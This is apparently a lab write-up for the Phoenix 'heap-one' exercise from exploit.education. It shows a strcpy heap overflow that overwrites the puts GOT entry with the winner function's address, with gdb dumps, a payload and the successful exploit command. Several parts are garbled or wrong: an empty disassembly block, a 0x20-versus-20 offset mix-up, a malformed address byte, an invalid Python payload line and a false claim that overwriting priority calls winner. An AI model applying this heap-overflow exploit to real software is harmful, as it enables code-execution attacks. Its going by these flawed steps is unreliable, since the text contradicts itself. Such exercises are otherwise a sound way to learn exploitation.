### Quick Overview

Similar to Heap Zero, Heap One exercise motive is to smash the heap to modify other variables in the heap to a `hex value` and technically overwrite `struct` in the heap. Similar to `gets` in Stack Zero, `strcpy` function is unsafe that doesn't have bounds check, it accepts memory address to write but doesn't care about overwriting other declared struct variable in the heap region.

### Disassemble

Disassembling the code will get you overall idea behind the heap-one code, One can use `gdb ./heap-one` to start debugging it in runtime.

1. `gdb ./heap-one`
2. Type `disassemble main` to get the disassembled code (assembly)

```assembly

If you carefully check the source, you might miss `winner` in the above disassembled code. You can go ahead and type `disassemble winner` in the gdb prompt,

```assembly
   0x0804889a <+0>:     push   ebp
   0x0804889b <+1>:     mov    ebp,esp
   0x0804889d <+3>:     sub    esp,0x8
   0x080488a0 <+6>:     sub    esp,0xc
   0x080488a3 <+9>:     push   0x0
   0x080488a5 <+11>:    call   0x8048610 <time@plt>
   0x080488aa <+16>:    add    esp,0x10
   0x080488ad <+19>:    sub    esp,0x8
   0x080488b0 <+22>:    push   eax
   0x080488b1 <+23>:    push   0x804ab8c
   0x080488b6 <+28>:    call   0x8048580 <printf@plt>
   0x080488bb <+33>:    add    esp,0x10
   0x080488be <+36>:    nop
   0x080488bf <+37>:    leave
   0x080488c0 <+38>:    ret
```

Before taking a look at the code, if you disassembled the heap-one using gdb to view the assembly instruction, you may notice the puts, fflush, exit and gets function calls with parameters. So basically when you hit `r` in gdb without breakpoint,

- Greet with `Welcome to phoenix/heap-one, brought to you by https://exploit.education` message via Puts (aka printf) method
- In the main() function, the program declares two pointers to struct heapStructure called i1 and i2.
- The program allocates memory for i1 using malloc() and sets its priority field to 1.
- The program allocates memory for i1's name field using malloc() and reserves 8 bytes of memory for it.
- The program allocates memory for i2 using malloc() and sets its priority field to 2.
- The program allocates memory for i2's name field using malloc() and reserves 8 bytes of memory for it.
- The program uses strcpy() to copy the first command-line argument passed to it by the user into the name field of i1.
- The program uses strcpy() to copy the second command-line argument passed to it by the user into the name field of i2.
- The program prints out a message saying "and that's a wrap folks!" and then exits.

### Primary Goal

The primary goal of this exercise is to make you familiar to overwrite function pointer with your own function pointer and therefore redirecting the program flow to achieve code execution within the binary/program. In ideal exploit world, you may overwrite the function pointer and redirect to `system` function call to achieve remote code execution and [this](https://securitylab.github.com/research/now-you-c-me-part-two/) blog post good example of reflecting this goal. In this exercise, you might want to overwrite the struct `i2` with `i1` and finally overwrite the `Global offset table`.

### Memory Allocation

As you see that the `heapStructure` struct is dynamically allocated, they are allocated seperately by `malloc` different from stack frame. You can see that `i1.name` (8 bytes) gets written at `0xf7e69008` and `priority` integer variable (4 bytes). The `i2.name` (8 bytes) gets written at `0xf7e69028` and `priority` integer variable (4 bytes). You can verify this by using `vmmap` command in gdb.

However, you might want to overwrite the `i2` heap with `i1.name`. To find the offset you can simply use `p i1.name - p i2.priority` in gdb. The offset is `0x20` bytes. So, you can overwrite the `i2` heap with `i1.name` by using `r $(python -c "print('A'*20)")` in gdb. You can verify this by using `vmmap` command in gdb. Now that you have overwritten the `i2` heap with `i1.name`, you can overwrite the `i2.priority` with `1` to get the `winner` function called.
** note that the memory address of `i2.name` is `0xf7e69038` which is located within the struct**. You could potentially overwrite this memory address with actual `winner` function address and `strcpy` will take care of the rest.

```assembly
(gdb) x/12xw 0xf7e69008 # i1
0xf7e69008:     0x00000001      0xf7e69018      0x00000000      0x00000011
0xf7e69018:     0x41414141      0x41414141      0x41414141      0x41414141
0xf7e69028:     0x41414141      0x41414141      0x00000000      0x00000011
(gdb) x/12xw 0xf7e69028 #i2
0xf7e69028:     0x41414141      0x41414141      0x00000000      0x00000011
0xf7e69038:     0x00000000      0x00000000      0x00000000      0x000fffc1
0xf7e69048:     0x00000000      0x00000000      0x00000000      0x00000000
```

To get the winner memory address, you can use gdb to disassemble the `winner` function and note down the starting address of the function. You can use `disassemble winner` command in gdb to disassemble the `winner` function. The starting address of the `winner` function is `0x0804889a`. The address `0x0804889a` can be represented in little endian format as `\9a\x88\x04\x08`. So, the final payload would be `20 bytes of A + 4 bytes GOT table puts address` and the second argument `4 bytes winner address` . The `puts` aka `printf` address can be found by using `objdump -R heap-one | grep puts` command which is `0804c140`

You can use python to generate the payload as follows,

```python
print('A'*20 + '\x40\xc1\x04\x08') + print ('\x9a\x88\x04\x08')
```

### Exploit

So, the final exploit would be as follows,

```assembly
user@phoenix-amd64:/opt/phoenix/i486$ 
/opt/phoenix/i486/heap-one $(python -c "print 'A'*20 + '\x40\xc1\x04\x08'") $(python -c "print '\x9a\x88\x04\x08'")
Congratulations, you've completed this level @ 1683325305 seconds past the Epoch
```

There you go! 🎉 You've officially `pwned` the `binary` and possibly you could control the program flow and may eventually 
perform remote code execution in the system. 🪲
